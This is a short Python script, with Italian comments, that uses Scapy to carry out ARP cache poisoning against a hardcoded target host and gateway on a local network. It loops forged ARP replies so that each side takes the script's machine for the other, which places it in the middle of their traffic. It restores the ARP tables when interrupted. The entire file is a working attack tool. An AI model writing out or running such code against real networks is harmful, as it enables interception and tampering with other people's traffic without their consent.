import sys
sys.path.append('/home/danilo/.local/lib/pythonX.X/site-packages')
from scapy.all import *
import time
import os

# Inserisci gli indirizzi IP e MAC
target_ip = "192.168.1.47"    # IP del dispositivo bersaglio
gateway_ip = "192.168.1.1"   # IP del gateway (ad esempio, il router)
target_mac = "14:5a:fc:12:f2:4d"  # MAC del bersaglio
gateway_mac = "BC:CF:4F:37:0A:61" # MAC del gateway

def get_mac(ip):
    # Funzione per ottenere il MAC di un IP nella rete locale
    ans, _ = sr(ARP(op=1, pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

def poison(target_ip, target_mac, source_ip):
    # Crea e invia pacchetti ARP falsi
    poison_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)
    send(poison_packet, verbose=False)

def restore(destination_ip, destination_mac, source_ip, source_mac):
    # Ripristina la tabella ARP con le informazioni corrette
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    # Prendi automaticamente i MAC se non specificati
    if not target_mac:
        target_mac = get_mac(target_ip)
    if not gateway_mac:
        gateway_mac = get_mac(gateway_ip)

    print(f"[INFO] Avvio ARP poisoning su {target_ip} e {gateway_ip}")
    try:
        while True:
            poison(target_ip, target_mac, gateway_ip)  # Il bersaglio pensa che siamo il gateway
            poison(gateway_ip, gateway_mac, target_ip) # Il gateway pensa che siamo il bersaglio
            time.sleep(2)
    except KeyboardInterrupt:
        print("[INFO] Interruzione, ripristino ARP...")
        restore(target_ip, target_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[INFO] ARP ripristinato correttamente.")
